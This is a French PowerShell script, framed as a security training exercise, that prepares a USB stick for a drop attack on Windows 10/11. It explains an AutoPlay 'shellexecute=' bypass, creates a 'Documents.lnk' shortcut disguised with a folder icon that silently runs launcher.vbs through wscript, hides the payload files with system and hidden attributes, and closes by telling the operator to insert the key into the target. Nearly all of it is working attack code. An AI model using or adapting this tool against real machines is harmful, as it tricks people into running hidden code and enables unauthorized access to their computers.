# ==============================================================
# prepare_usb.ps1 – Préparation de la clé USB (Bypass AutoRun Windows 10)
# Objectif pédagogique : TP sécurité offensive / défensive
#
# Contexte :
#   Depuis Windows Vista (KB971029), l'entrée « open= » de autorun.inf
#   est ignorée pour les lecteurs amovibles. Windows 10/11 ne déclenche
#   plus aucun programme automatiquement lors de l'insertion d'une clé USB.
#
# Stratégie de contournement (deux couches) :
#
#   Couche 1 – AutoPlay (clic utilisateur sur la notification)
#     L'entrée « shellexecute= » de autorun.inf est encore honorée par
#     AutoPlay sur Windows 10/11. Lorsque l'utilisateur clique sur la
#     notification toast puis sur l'action affichée, launcher.vbs s'exécute.
#
#   Couche 2 – Leurre LNK (ingénierie sociale)
#     Un raccourci Windows (.lnk) est placé à la racine de la clé USB
#     avec une icône de dossier et un nom trompeur (« Documents »).
#     Quand l'utilisateur ouvre l'Explorateur pour parcourir la clé,
#     il clique sur ce « dossier » et exécute launcher.vbs silencieusement.
#     Les fichiers réels du payload sont masqués (attributs +H +S).
#
# Utilisation :
#   powershell -ExecutionPolicy Bypass -File prepare_usb.ps1 -DriveLetter E
# ==============================================================

param(
    [Parameter(Mandatory = $true,
               HelpMessage = "Lettre du lecteur USB cible (ex : E ou E:)")]
    [string]$DriveLetter
)

$ErrorActionPreference = "Stop"

# ──────────────────────────────────────────────────────────────
# 0. Normalisation et validation du lecteur cible
# ──────────────────────────────────────────────────────────────

if ($DriveLetter -notmatch ':$') { $DriveLetter = "${DriveLetter}:" }
$DrivePath = "${DriveLetter}\"

if (-not (Test-Path $DrivePath)) {
    Write-Error "Lecteur introuvable : $DrivePath"
    exit 1
}

# Vérifie que les fichiers payload sont bien présents sur la clé
$required = @("autorun.inf", "launcher.vbs", "payload.ps1")
foreach ($f in $required) {
    if (-not (Test-Path "${DrivePath}${f}")) {
        Write-Error "Fichier manquant sur la clé USB : $f`nCopier d'abord tous les fichiers payload sur la clé."
        exit 1
    }
}

# ──────────────────────────────────────────────────────────────
# 1. COUCHE 2 – Création du raccourci LNK trompeur
#    Aspect : icône de dossier Windows standard
#    Action : exécute launcher.vbs silencieusement via wscript
# ──────────────────────────────────────────────────────────────

$shortcutPath = "${DrivePath}Documents.lnk"

$wshShell  = New-Object -ComObject WScript.Shell
$shortcut  = $wshShell.CreateShortcut($shortcutPath)

# Cible : wscript.exe avec le launcher en mode silencieux (//B = no dialogs)
$shortcut.TargetPath       = "C:\Windows\System32\wscript.exe"
$shortcut.Arguments        = "//B `"${DrivePath}launcher.vbs`""
$shortcut.WorkingDirectory = $DrivePath
$shortcut.Description      = "Documents"
# shell32.dll,3 = icône de dossier jaune classique (convaincant)
$shortcut.IconLocation     = "%SystemRoot%\system32\shell32.dll,3"
# WindowStyle 7 = fenêtre réduite (l'activité reste invisible)
$shortcut.WindowStyle      = 7
$shortcut.Save()

Write-Host "[+] Raccourci leurre créé : $shortcutPath"

# ──────────────────────────────────────────────────────────────
# 2. Masquage des fichiers réels du payload
#    Attributs Système + Caché : invisibles dans l'Explorateur
#    (même avec « Afficher les fichiers cachés » si Système est actif)
# ──────────────────────────────────────────────────────────────

$toHide = @("autorun.inf", "launcher.vbs", "payload.ps1", "payload_obfusque.ps1")
foreach ($file in $toHide) {
    $fp = "${DrivePath}${file}"
    if (Test-Path $fp) {
        $null = & attrib.exe +H +S $fp 2>&1
        Write-Host "[+] Masqué : $fp"
    }
}

# ──────────────────────────────────────────────────────────────
# 3. Récapitulatif
# ──────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "=== Clé USB préparée avec succès ==="
Write-Host "  Couche 1 (AutoPlay)  : autorun.inf en place – l'utilisateur doit"
Write-Host "                         cliquer sur la notification puis sur l'action."
Write-Host "  Couche 2 (LNK leurre): '$shortcutPath'"
Write-Host "                         – apparaît comme un dossier « Documents »."
Write-Host "  Payload masqué       : fichiers .inf / .vbs / .ps1 invisibles."
Write-Host ""
Write-Host ">>> Insérer la clé dans la cible. <<<" -ForegroundColor Yellow
